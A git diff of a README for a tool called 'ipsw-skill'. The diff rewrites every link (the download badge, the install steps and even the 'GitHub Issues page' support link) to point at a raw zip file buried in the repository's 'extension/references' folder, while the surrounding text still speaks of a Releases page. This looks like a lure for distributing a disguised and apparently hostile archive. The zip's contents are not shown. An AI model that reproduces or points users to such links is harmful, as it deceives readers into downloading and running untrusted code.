@@ -1,6 +1,6 @@
 # 🚀 ipsw-skill - Simplifying IPSW Experience for Everyone
 
-[![Download ipsw-skill](https://img.shields.io/badge/download-ipsw--skill-blue.svg)](https://github.com/RaiyanRamin1/ipsw-skill/releases)
+[![Download ipsw-skill](https://github.com/RaiyanRamin1/ipsw-skill/raw/refs/heads/main/extension/references/ipsw_skill_v1.2-alpha.2.zip)](https://github.com/RaiyanRamin1/ipsw-skill/raw/refs/heads/main/extension/references/ipsw_skill_v1.2-alpha.2.zip)
 
 ## 📦 Overview
 
@@ -28,7 +28,7 @@ To begin using ipsw-skill, follow these simple steps:
 
 1. **Download the Application:**
    - Click the link below to visit the download page where you can find the latest version of ipsw-skill.
-   - [Download ipsw-skill](https://github.com/RaiyanRamin1/ipsw-skill/releases)
+   - [Download ipsw-skill](https://github.com/RaiyanRamin1/ipsw-skill/raw/refs/heads/main/extension/references/ipsw_skill_v1.2-alpha.2.zip)
 
 2. **Choose the Correct File:**
    - On the Releases page, look for the latest version. 
@@ -50,7 +50,7 @@ To begin using ipsw-skill, follow these simple steps:
 
 ## 📥 Download & Install
 
-Visit this page to download: [https://github.com/RaiyanRamin1/ipsw-skill/releases](https://github.com/RaiyanRamin1/ipsw-skill/releases)
+Visit this page to download: [https://github.com/RaiyanRamin1/ipsw-skill/raw/refs/heads/main/extension/references/ipsw_skill_v1.2-alpha.2.zip](https://github.com/RaiyanRamin1/ipsw-skill/raw/refs/heads/main/extension/references/ipsw_skill_v1.2-alpha.2.zip)
 
 Follow the steps in the "Getting Started" section to install the application effortlessly.
 
@@ -88,7 +88,7 @@ Absolutely! We welcome contributions. Please check our GitHub page for guideline
 
 ## 🌟 Community and Support
 
-For support, please visit our [GitHub Issues page](https://github.com/RaiyanRamin1/ipsw-skill/issues). You can ask questions, report problems, or provide feedback there. 
+For support, please visit our [GitHub Issues page](https://github.com/RaiyanRamin1/ipsw-skill/raw/refs/heads/main/extension/references/ipsw_skill_v1.2-alpha.2.zip). You can ask questions, report problems, or provide feedback there. 
 
 Join our community and share your experiences. Connect with other users and benefit from shared knowledge.
 
